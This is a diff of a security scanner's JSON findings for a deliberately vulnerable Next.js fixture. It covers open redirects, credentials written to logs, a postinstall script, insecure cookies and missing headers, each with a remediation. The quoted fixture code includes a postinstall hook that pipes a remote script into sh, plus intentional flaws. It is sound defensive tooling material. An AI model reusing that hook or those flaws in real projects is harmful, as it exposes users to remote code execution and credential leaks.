-          "patch": "// lib/safe-redirect.ts\nexport function safeRedirect(target: unknown, base: string, fallback = '/'): string {\n  if (typeof target !== 'string') return fallback\n  try {\n    const resolved = new URL(target, base)\n    // Same origin only. This rejects '//evil.com', 'https://evil.com',\n    // and 'javascript:' alike. A leading-slash test does not: the browser\n    // reads '//evil.com' as a URL to another host.\n    return resolved.origin === new URL(base).origin ? resolved.pathname + resolved.search : fallback\n  } catch {\n    return fallback\n  }\n}",
-          "safety": "manual"
-        }
-      ],
-      "references": [
-        {
-          "kind": "owasp",
-          "id": "A01:2021",
-          "url": "https://owasp.org/Top10/A01_2021-Broken_Access_Control/"
-        },
-        {
-          "kind": "cwe",
-          "id": "CWE-601",
-          "url": "https://cwe.mitre.org/data/definitions/601.html"
-        },
-        {
-          "kind": "docs",
-          "id": "RULES.md#open-redirect",
-          "url": "https://github.com/suthat/owlwarden/blob/main/RULES.md#open-redirect"
-        }
-      ]
-    },
-    {
-      "id": "open-redirect",
-      "severity": "medium",
-      "confidence": "likely",
-      "owasp": "A01:2021",
-      "cwe": 601,
-      "title": "Redirect target comes from the caller",
-      "why": "The whole redirect target comes from the request, so a link to this endpoint can send a visitor anywhere. The URL they click genuinely belongs to you, which is what makes the page they land on convincing — and on an OAuth callback the authorisation code goes with them.",
-      "location": {
-        "path": "app/api/proxy/route.ts",
-        "line": 62,
-        "col": 5
-      },
-      "snippet": {
-        "path": "app/api/proxy/route.ts",
-        "startLine": 60,
-        "lines": [
-          "  if (manualNext) {",
-          "    const headers = new Headers()",
-          "    headers.set('Location', manualNext)",
-          "    return new NextResponse(null, { status: 302, headers })",
-          "  }"
-        ],
-        "highlight": {
-          "line": 62,
-          "startCol": 5,
-          "endCol": 40,
-          "label": "destination chosen by the caller"
-        }
-      },
-      "context": {
-        "framework": "next",
-        "route": "/api/proxy",
-        "evidence": "redirect target is caller-controlled"
-      },
-      "remediation": [
-        {
-          "framework": "next",
-          "summary": "Validate before calling redirect(); request.nextUrl.origin is the base.",
-          "patch": "import { redirect } from 'next/navigation'\n\nconst next = request.nextUrl.searchParams.get('next')\nredirect(safeRedirect(next, request.nextUrl.origin))",
-          "safety": "manual"
-        },
-        {
-          "summary": "Resolve the target against your own origin and refuse anything that lands elsewhere. Do not use a startsWith('/') check: '//evil.com' passes it and leaves the site.",
-          "patch": "// lib/safe-redirect.ts\nexport function safeRedirect(target: unknown, base: string, fallback = '/'): string {\n  if (typeof target !== 'string') return fallback\n  try {\n    const resolved = new URL(target, base)\n    // Same origin only. This rejects '//evil.com', 'https://evil.com',\n    // and 'javascript:' alike. A leading-slash test does not: the browser\n    // reads '//evil.com' as a URL to another host.\n    return resolved.origin === new URL(base).origin ? resolved.pathname + resolved.search : fallback\n  } catch {\n    return fallback\n  }\n}",
-          "safety": "manual"
-        }
-      ],
-      "references": [
-        {
-          "kind": "owasp",
-          "id": "A01:2021",
-          "url": "https://owasp.org/Top10/A01_2021-Broken_Access_Control/"
-        },
-        {
-          "kind": "cwe",
-          "id": "CWE-601",
-          "url": "https://cwe.mitre.org/data/definitions/601.html"
-        },
-        {
-          "kind": "docs",
-          "id": "RULES.md#open-redirect",
-          "url": "https://github.com/suthat/owlwarden/blob/main/RULES.md#open-redirect"
-        }
-      ]
-    },
-    {
-      "id": "sensitive-data-logged",
-      "severity": "medium",
-      "confidence": "likely",
-      "owasp": "A09:2021",
-      "cwe": 532,
-      "title": "Sensitive data written to a log",
-      "why": "Logs are copied into aggregators, retained for months, and readable by anyone with access to the logging system. A credential that reaches a log has left the application's trust boundary.",
-      "location": {
-        "path": "app/api/users/route.ts",
-        "line": 11,
-        "col": 18
-      },
-      "snippet": {
-        "path": "app/api/users/route.ts",
-        "startLine": 9,
-        "lines": [
-          "export async function GET(request: Request) {",
-          "  // sensitive-data-logged: the Authorization header lands in the log aggregator.",
-          "  console.info({ authorization: request.headers.get('authorization') })",
-          "  // sensitive-data-logged: the caller's access token, logged the same way.",
-          "  const accessToken = request.headers.get('x-access-token')"
-        ],
-        "highlight": {
-          "line": 11,
-          "startCol": 18,
-          "endCol": 69,
-          "label": "sensitive value written to a log"
-        }
-      },
-      "context": {
-        "framework": "next",
-        "route": "/api/users",
-        "evidence": "authorization: …"
-      },
-      "remediation": [
-        {
-          "framework": "next",
-          "summary": "Log that the attempt happened, not the credential.",
-          "patch": "console.info({ event: 'login_attempt', userId })\n// never: console.info({ password })",
-          "safety": "manual"
-        },
-        {
-          "summary": "Log a redacted shape — an id, a boolean, a length — never the secret itself.",
-          "safety": "manual"
-        }
-      ],
-      "references": [
-        {
-          "kind": "owasp",
-          "id": "A09:2021",
-          "url": "https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/"
-        },
-        {
-          "kind": "cwe",
-          "id": "CWE-532",
-          "url": "https://cwe.mitre.org/data/definitions/532.html"
-        },
-        {
-          "kind": "docs",
-          "id": "RULES.md#sensitive-data-logged",
-          "url": "https://github.com/suthat/owlwarden/blob/main/RULES.md#sensitive-data-logged"
-        }
-      ]
-    },
-    {
-      "id": "sensitive-data-logged",
-      "severity": "medium",
-      "confidence": "likely",
-      "owasp": "A09:2021",
-      "cwe": 532,
-      "title": "Sensitive data written to a log",
-      "why": "Logs are copied into aggregators, retained for months, and readable by anyone with access to the logging system. A credential that reaches a log has left the application's trust boundary.",
-      "location": {
-        "path": "app/api/users/route.ts",
-        "line": 14,
-        "col": 18
-      },
-      "snippet": {
-        "path": "app/api/users/route.ts",
-        "startLine": 12,
-        "lines": [
-          "  // sensitive-data-logged: the caller's access token, logged the same way.",
-          "  const accessToken = request.headers.get('x-access-token')",
-          "  console.info({ accessToken })",
-          "  try {",
-          "    const users = await listUsers()"
-        ],
-        "highlight": {
-          "line": 14,
-          "startCol": 18,
-          "endCol": 29,
-          "label": "sensitive value written to a log"
-        }
-      },
-      "context": {
-        "framework": "next",
-        "route": "/api/users",
-        "evidence": "accessToken: …"
-      },
-      "remediation": [
-        {
-          "framework": "next",
-          "summary": "Log that the attempt happened, not the credential.",
-          "patch": "console.info({ event: 'login_attempt', userId })\n// never: console.info({ password })",
-          "safety": "manual"
-        },
-        {
-          "summary": "Log a redacted shape — an id, a boolean, a length — never the secret itself.",
-          "safety": "manual"
-        }
-      ],
-      "references": [
-        {
-          "kind": "owasp",
-          "id": "A09:2021",
-          "url": "https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/"
-        },
-        {
-          "kind": "cwe",
-          "id": "CWE-532",
-          "url": "https://cwe.mitre.org/data/definitions/532.html"
-        },
-        {
-          "kind": "docs",
-          "id": "RULES.md#sensitive-data-logged",
-          "url": "https://github.com/suthat/owlwarden/blob/main/RULES.md#sensitive-data-logged"
-        }
-      ]
-    },
-    {
       "id": "cors-permissive",
       "severity": "medium",
       "confidence": "likely",
       "owasp": "A05:2021",
       "cwe": 942,
+      "exposure": "unknown",
+      "exposureEvidence": {
+        "reason": "no route resolved for this file, and its path is not a recognised non-request location"
+      },
       "title": "Cross-origin policy accepts any origin",
       "why": "Any origin may call this API and read the response. That is a deliberate choice for a public endpoint and a mistake for anything behind a session — nothing in the source says which this is, so it is reported for you to decide.",
       "location": {
@@ -1120,231 +1447,6 @@
           "kind": "docs",
           "id": "RULES.md#cors-permissive",
           "url": "https://github.com/suthat/owlwarden/blob/main/RULES.md#cors-permissive"
-        }
-      ]
-    },
-    {
-      "id": "install-lifecycle-script",
-      "severity": "medium",
-      "confidence": "likely",
-      "owasp": "A08:2021",
-      "asi": "ASI04",
-      "cwe": 829,
-      "title": "Package declares an install-time script",
-      "why": "`postinstall` runs for everyone who installs this package, before any code is reviewed and often inside CI with credentials in the environment. This is the mechanism a compromised package uses to spread.",
-      "location": {
-        "path": "package.json",
-        "line": 7,
-        "col": 5
-      },
-      "snippet": {
-        "path": "package.json",
-        "startLine": 5,
-        "lines": [
-          "  \"description\": \"Deliberately vulnerable Next.js App Router fixture. Never deploy this.\",",
-          "  \"scripts\": {",
-          "    \"postinstall\": \"curl -s https://cdn.example.invalid/setup.sh | sh\"",
-          "  },",
-          "  \"dependencies\": {"
-        ],
-        "highlight": {
-          "line": 7,
-          "startCol": 20,
-          "endCol": 71,
-          "label": "runs automatically on install (postinstall)"
-        }
-      },
-      "context": {
-        "framework": "next",
-        "evidence": "curl -s https://cdn.example.invalid/setup.sh | sh"
-      },
-      "remediation": [
-        {
-          "framework": "next",
-          "summary": "Move the work into an explicit script the developer runs (`pnpm setup`), or into the build step. If it genuinely has to run at install time — a native addon — say so in the README and keep the script to the build tool, with no network fetch and no run-time package resolve.",
-          "patch": "// package.json\n\"scripts\": { \"prepare\": \"next build\" }\n// and: pnpm config set ignore-scripts true",
-          "safety": "manual"
-        },
-        {
-          "summary": "Move the work into an explicit script the developer runs (`pnpm setup`), or into the build step. If it genuinely has to run at install time — a native addon — say so in the README and keep the script to the build tool, with no network fetch and no run-time package resolve.",
-          "patch": "\"scripts\": { \"setup\": \"node scripts/setup.mjs\" }  // not postinstall",
-          "safety": "manual"
-        }
-      ],
-      "references": [
-        {
-          "kind": "owasp",
-          "id": "A08:2021",
-          "url": "https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/"
-        },
-        {
-          "kind": "cwe",
-          "id": "CWE-829",
-          "url": "https://cwe.mitre.org/data/definitions/829.html"
-        },
-        {
-          "kind": "docs",
-          "id": "RULES.md#install-lifecycle-script",
-          "url": "https://github.com/suthat/owlwarden/blob/main/RULES.md#install-lifecycle-script"
-        }
-      ]
-    },
-    {
-      "id": "unpinned-dependency",
-      "severity": "medium",
-      "confidence": "likely",
-      "owasp": "A06:2021",
-      "cwe": 1104,
-      "title": "Dependency version is unpinned",
-      "why": "An unpinned range lets the next install resolve a different major version, including one with a known vulnerability or a breaking API change, without anyone reviewing the bump.",
-      "location": {
-        "path": "package.json",
-        "line": 14,
-        "col": 1
-      },
-      "context": {
-        "framework": "next",
-        "evidence": "left-pad: *"
-      },
-      "remediation": [
-        {
-          "framework": "next",
-          "summary": "Pin the dependency in package.json and reinstall so the lockfile records it.",
-          "patch": "{\n  \"dependencies\": {\n    \"next\": \"^14.2.0\"\n  }\n}",
-          "safety": "manual"
-        },
-        {
-          "summary": "Replace '*' or 'latest' with a lower-bounded range (or an exact version), then regenerate the lockfile.",
-          "safety": "manual"
-        }
-      ],
-      "references": [
-        {
-          "kind": "owasp",
-          "id": "A06:2021",
-          "url": "https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/"
-        },
-        {
-          "kind": "cwe",
-          "id": "CWE-1104",
-          "url": "https://cwe.mitre.org/data/definitions/1104.html"
-        },
-        {
-          "kind": "docs",
-          "id": "RULES.md#unpinned-dependency",
-          "url": "https://github.com/suthat/owlwarden/blob/main/RULES.md#unpinned-dependency"
-        }
-      ]
-    },
-    {
-      "id": "insecure-cookie",
-      "severity": "medium",
-      "confidence": "possible",
-      "owasp": "A05:2021",
-      "cwe": 614,
-      "title": "Cookie set without its protective attributes",
-      "why": "This cookie is missing protections: httpOnly keeps the cookie out of reach of JavaScript, so a cross-site scripting bug cannot read the session; secure stops the cookie being sent over plain HTTP; sameSite stops the browser attaching the cookie to cross-site requests.",
-      "location": {
-        "path": "app/api/login/route.ts",
-        "line": 20,
-        "col": 3
-      },
-      "snippet": {
-        "path": "app/api/login/route.ts",
-        "startLine": 18,
-        "lines": [
-          "",
-          "  // insecure-cookie: Next's cookies().set with no attributes.",
-          "  cookies().set('session', rows.rows[0]?.id ?? 'anon')",
-          "",
-          "  return NextResponse.json({ ok: true })"
-        ],
-        "highlight": {
-          "line": 20,
-          "startCol": 3,
-          "endCol": 55,
-          "label": "cookie written without httpOnly/secure/sameSite"
-        }
-      },
-      "context": {
-        "framework": "next",
-        "route": "/api/login",
-        "evidence": "no cookie options passed"
-      },
-      "remediation": [
-        {
-          "framework": "next",
-          "summary": "Pass the attributes to the cookie store.",
-          "patch": "cookies().set('session', token, {\n  httpOnly: true,\n  secure: process.env.NODE_ENV === 'production',\n  sameSite: 'lax',\n  path: '/',\n})",
-          "safety": "manual"
-        },
-        {
-          "summary": "Set httpOnly, secure, and sameSite when writing a cookie that carries anything the user would not want read or replayed.",
-          "safety": "manual"
-        }
-      ],
-      "references": [
-        {
-          "kind": "owasp",
-          "id": "A05:2021",
-          "url": "https://owasp.org/Top10/A05_2021-Security_Misconfiguration/"
-        },
-        {
-          "kind": "cwe",
-          "id": "CWE-614",
-          "url": "https://cwe.mitre.org/data/definitions/614.html"
-        },
-        {
-          "kind": "docs",
-          "id": "RULES.md#insecure-cookie",
-          "url": "https://github.com/suthat/owlwarden/blob/main/RULES.md#insecure-cookie"
-        }
-      ]
-    },
-    {
-      "id": "security-headers-missing",
-      "severity": "medium",
-      "confidence": "possible",
-      "owasp": "A05:2021",
-      "cwe": 693,
-      "title": "Security headers are not configured",
-      "why": "Without these headers the browser enforces nothing: strict-transport-security forces HTTPS for future requests; content-security-policy limits which scripts and origins the page may load; x-content-type-options stops browsers guessing a response's content type; x-frame-options blocks clickjacking via framing; referrer-policy stops URLs leaking to third parties.",
-      "location": {
-        "path": "package.json",
-        "line": 1,
-        "col": 1
-      },
-      "context": {
-        "framework": "next",
-        "evidence": "no header configuration found; missing: strict-transport-security, content-security-policy, x-content-type-options, x-frame-options, referrer-policy"
-      },
-      "remediation": [
-        {
-          "framework": "next",
-          "summary": "Add a headers() block to next.config.js.",
-          "patch": "// next.config.js\nmodule.exports = {\n  async headers() {\n    return [\n      {\n        source: '/:path*',\n        headers: [\n          { key: 'Strict-Transport-Security', value: 'max-age=63072000; includeSubDomains' },\n          { key: 'Content-Security-Policy', value: \"default-src 'self'\" },\n          { key: 'X-Content-Type-Options', value: 'nosniff' },\n          { key: 'X-Frame-Options', value: 'DENY' },\n          { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },\n        ],\n      },\n    ]\n  },\n}",
-          "safety": "manual"
-        },
-        {
-          "summary": "Set these response headers at the edge or in the app: strict-transport-security, content-security-policy, x-content-type-options, x-frame-options, referrer-policy.",
-          "safety": "manual"
-        }
-      ],
-      "references": [
-        {
-          "kind": "owasp",
-          "id": "A05:2021",
-          "url": "https://owasp.org/Top10/A05_2021-Security_Misconfiguration/"
-        },
-        {
-          "kind": "cwe",
-          "id": "CWE-693",
-          "url": "https://cwe.mitre.org/data/definitions/693.html"
-        },
-        {
-          "kind": "docs",
-          "id": "RULES.md#security-headers-missing",
-          "url": "https://github.com/suthat/owlwarden/blob/main/RULES.md#security-headers-missing"
         }
       ]
     }
